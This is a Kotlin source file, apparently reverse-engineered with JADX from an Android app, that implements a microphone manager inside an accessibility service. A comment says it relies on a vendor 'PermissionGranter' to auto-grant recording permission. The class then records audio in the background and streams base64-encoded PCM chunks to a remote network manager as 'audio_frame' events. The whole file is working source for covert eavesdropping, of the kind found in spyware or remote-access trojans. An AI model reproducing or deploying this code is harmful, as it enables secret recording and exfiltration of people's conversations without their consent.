package com.storm.safe.rock.manager

import android.media.AudioRecord
import android.media.audiofx.AcousticEchoCanceler
import android.media.audiofx.NoiseSuppressor
import android.util.Base64
import android.util.Log
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong

/**
 * Audio recording manager using AudioRecord API.
 *
 * Reverse-engineered from JADX: manager/C0259a1.java (487 LOC).
 *
 * Features:
 * - AudioRecord with configurable sample rate and audio source
 * - Noise suppression and echo cancellation
 * - Volume gain adjustment
 * - Background recording with coroutine
 * - Base64-encoded PCM chunks sent to NetworkManager
 * - Thread-safe state management with AtomicBoolean
 */
class C0259a1(
    private val accessibilityService: MyAccessibilityService
) {
    companion object {
        const val TAG = "MicrophoneManager"

        /** Number of chunks to buffer before sending */
        private const val CHUNKS_PER_SEND = 5

        /** Target chunk duration: 40ms of audio */
        private const val CHUNK_DURATION_MS = 40

        /** Target frame interval: 20ms */
        private const val FRAME_INTERVAL_NS = 20_000_000L

        /** Buffer multiplier for AudioRecord */
        private const val BUFFER_MULTIPLIER = 8

        /** Max wait cycles for permission (16 × 500ms = 8s) */
        private const val PERMISSION_WAIT_CYCLES = 16

        /** Permission wait interval */
        private const val PERMISSION_WAIT_MS = 500L
    }

    /**
     * Audio quality modes with sample rates.
     * JADX: MicrophoneManager$QualityMode
     */
    enum class QualityMode(val sampleRate: Int) {
        HIGH(44100),
        STANDARD(16000),
        LOW(8000)
    }

    /**
     * Audio source types with Android MediaRecorder source IDs.
     * JADX: MicrophoneManager$AudioSource
     */
    enum class AudioSource(val androidSourceId: Int, val displayName: String) {
        DEFAULT(0, "DEFAULT"),
        MIC(1, "MIC"),
        VOICE_RECOGNITION(6, "VOICE_RECOGNITION"),
        VOICE_COMMUNICATION(7, "VOICE_COMMUNICATION"),
        CAMCORDER(5, "CAMCORDER")
    }

    // ── State fields (match JADX field layout) ──

    /** AudioRecord instance */
    private var audioRecord: AudioRecord? = null

    /** Recording state flag */
    private val isRecordingFlag = AtomicBoolean(false)

    /** Recording coroutine job */
    private var recordingJob: Job? = null

    /** Coroutine scope for recording */
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /** Byte counter for tracking data sent */
    val bytesSent = AtomicLong(0L)

    /** Acoustic echo canceler */
    private var echoCanceler: AcousticEchoCanceler? = null

    /** Noise suppressor */
    private var noiseSuppressor: NoiseSuppressor? = null

    /** Current quality mode */
    var qualityMode: QualityMode = QualityMode.STANDARD

    /** Current audio source */
    var audioSource: AudioSource = AudioSource.VOICE_RECOGNITION
        private set

    /** Volume gain multiplier (1.0 = no change) */
    var volumeGain: Float = 1.0f

    /** Whether noise suppression is enabled */
    var noiseSuppressionEnabled: Boolean = true

    /** Whether currently recording */
    val isRecording: Boolean get() = isRecordingFlag.get()

    /**
     * Check microphone permission.
     * JADX: m211253a2
     */
    fun hasMicrophonePermission(): Boolean {
        return try {
            accessibilityService.checkSelfPermission("android.permission.RECORD_AUDIO") == 0
        } catch (e: Exception) {
            Log.e(TAG, "检查麦克风权限失败", e)
            false
        }
    }

    /**
     * Set audio source (only when not recording).
     * JADX: m211254a3
     */
    fun setAudioSource(source: AudioSource) {
        if (isRecordingFlag.get()) {
            Log.w(TAG, "⚠️ 录音中无法更改音频来源，请先停止录音")
            return
        }
        audioSource = source
        Log.d(TAG, "🎤 音频来源设置为: ${source.displayName}(${source.androidSourceId})")
    }

    /**
     * Start microphone recording.
     * JADX: m211255a4
     *
     * Steps:
     * 1. Check/request microphone permission
     * 2. Initialize AudioRecord with quality settings
     * 3. Set up noise suppression and echo cancellation
     * 4. Launch background recording coroutine
     */
    @Throws(IllegalStateException::class, InterruptedException::class)
    fun startRecording() {
        if (isRecordingFlag.get()) {
            Log.w(TAG, "🎤 录音已在进行中")
            return
        }

        if (!hasMicrophonePermission()) {
            Log.w(TAG, "⚠️ 麦克风权限未授予，尝试自动申请")
            try {
                // vendor: uses p000 PermissionGranter to auto-grant RECORD_AUDIO
                Log.d("dqtvuisjd", "🎤 申请麦克风权限（自动授权）")
                // Wait for permission grant
                for (i in 0 until PERMISSION_WAIT_CYCLES) {
                    try { Thread.sleep(PERMISSION_WAIT_MS) } catch (_: InterruptedException) {}
                    if (hasMicrophonePermission()) break
                }
                if (!hasMicrophonePermission()) {
                    Log.w(TAG, "⚠️ 等待后仍未获得麦克风权限，取消录音启动")
                    return
                }
            } catch (e: Exception) {
                Log.e(TAG, "触发麦克风权限申请失败", e)
                return
            }
        }

        try {
            val sampleRate = qualityMode.sampleRate
            val minBufferSize = AudioRecord.getMinBufferSize(
                sampleRate,
                android.media.AudioFormat.CHANNEL_IN_MONO,
                android.media.AudioFormat.ENCODING_PCM_16BIT
            )
            val chunkSize = (sampleRate * CHUNK_DURATION_MS) / 1000
            var bufferSize = chunkSize * BUFFER_MULTIPLIER
            if (bufferSize < minBufferSize) bufferSize = minBufferSize
            // Align to minBufferSize
            bufferSize = ((bufferSize + minBufferSize - 1) / minBufferSize) * minBufferSize

            val record = AudioRecord(
                audioSource.androidSourceId,
                sampleRate,
                android.media.AudioFormat.CHANNEL_IN_MONO,
                android.media.AudioFormat.ENCODING_PCM_16BIT,
                bufferSize
            )
            audioRecord = record

            if (record.state != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "❌ AudioRecord初始化失败")
                return
            }

            // Set up audio effects
            try {
                val sessionId = audioRecord?.audioSessionId ?: 0
                if (sessionId > 0) {
                    if (NoiseSuppressor.isAvailable()) {
                        val ns = NoiseSuppressor.create(sessionId)
                        noiseSuppressor = ns
                        ns?.setEnabled(noiseSuppressionEnabled)
                    }
                    if (AcousticEchoCanceler.isAvailable()) {
                        val ec = AcousticEchoCanceler.create(sessionId)
                        echoCanceler = ec
                        ec?.setEnabled(true)
                    }
                }
            } catch (_: Exception) {
                // Non-critical: effects are optional
            }

            isRecordingFlag.set(true)
            bytesSent.set(0L)

            recordingJob = scope.launch {
                recordAudioLoop(chunkSize, sampleRate, bufferSize)
            }
        } catch (e: Exception) {
            Log.e(TAG, "启动录音失败", e)
            isRecordingFlag.set(false)
        }
    }

    /**
     * Stop microphone recording and release resources.
     * JADX: m211256a5
     */
    fun stopRecording() {
        if (!isRecordingFlag.get()) {
            Log.w(TAG, "🎤 录音未在进行中")
            return
        }
        try {
            isRecordingFlag.set(false)
            recordingJob?.cancel()
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null

            try {
                noiseSuppressor?.setEnabled(false)
                noiseSuppressor?.release()
                noiseSuppressor = null
                echoCanceler?.setEnabled(false)
                echoCanceler?.release()
                echoCanceler = null
            } catch (_: Exception) {
                // Non-critical
            }
        } catch (e: Exception) {
            Log.e(TAG, "停止录音失败", e)
        }
    }

    /**
     * Main recording loop — reads PCM chunks, applies gain, sends base64 to network.
     * JADX: m211251a0 (suspend, merged from ContinuationImpl)
     */
    private suspend fun recordAudioLoop(chunkSize: Int, sampleRate: Int, totalBufferSize: Int) {
        try {
            audioRecord?.startRecording()
        } catch (e: Exception) {
            Log.e(TAG, "录音过程中发生错误", e)
            try { audioRecord?.stop() } catch (e2: Exception) { Log.e(TAG, "停止AudioRecord失败", e2) }
            return
        }

        val chunk = ByteArray(chunkSize)
        val sendBuffer = ByteArray(chunkSize * CHUNKS_PER_SEND)
        var bufferOffset = 0
        var chunkCount = 0
        val targetFrameNs = FRAME_INTERVAL_NS

        try {
            while (isRecordingFlag.get()) {
                val frameStart = System.nanoTime()

                // Read one chunk
                var bytesRead = 0
                while (bytesRead < chunkSize && isRecordingFlag.get()) {
                    val read = audioRecord?.read(chunk, bytesRead, chunkSize - bytesRead) ?: 0
                    if (read > 0) bytesRead += read
                }

                if (!isRecordingFlag.get()) break

                // Apply volume gain if not 1.0
                if (volumeGain != 1.0f) {
                    applyVolumeGain(chunk)
                }

                // Accumulate in send buffer
                System.arraycopy(chunk, 0, sendBuffer, bufferOffset, chunkSize)
                bufferOffset += chunkSize
                chunkCount++

                // Send when buffer is full
                if (chunkCount >= CHUNKS_PER_SEND) {
                    try {
                        val base64 = Base64.encodeToString(sendBuffer, Base64.NO_WRAP)
                        val networkManager = accessibilityService.getNetworkManager()
                        // vendor: C0323a8.m211660c6(sampleRate, totalBufferSize / 2, base64)
                        // JADX calls c0323a8M211471g5.m211660c6(sampleRate, totalBufferSize / 2, base64)
                        networkManager?.sendEvent("audio_frame", org.json.JSONObject().apply {
                            put("sampleRate", sampleRate)
                            put("samples", totalBufferSize / 2)
                            put("data", base64)
                        })
                    } catch (e: Exception) {
                        Log.e(TAG, "发送音频数据失败", e)
                    }
                    bufferOffset = 0
                    chunkCount = 0
                }

                // Timing control
                val elapsed = System.nanoTime() - frameStart
                if (elapsed < targetFrameNs) {
                    delay((targetFrameNs - elapsed) / 1_000_000)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "录音过程中发生错误", e)
        } finally {
            try { audioRecord?.stop() } catch (e: Exception) { Log.e(TAG, "停止AudioRecord失败", e) }
        }
    }

    /**
     * Apply volume gain to PCM 16-bit little-endian audio data.
     * JADX: m211252a1
     */
    internal fun applyVolumeGain(data: ByteArray) {
        val shortBuffer = ByteBuffer.wrap(data).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer()
        val remaining = shortBuffer.remaining()
        val samples = ShortArray(remaining)
        shortBuffer.get(samples)
        for (i in 0 until remaining) {
            samples[i] = (samples[i] * volumeGain).toInt().coerceIn(-32768, 32767).toShort()
        }
        ByteBuffer.wrap(data).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer().put(samples)
    }

    /**
     * Release all resources.
     */
    fun release() {
        stopRecording()
        scope.cancel()
    }
}
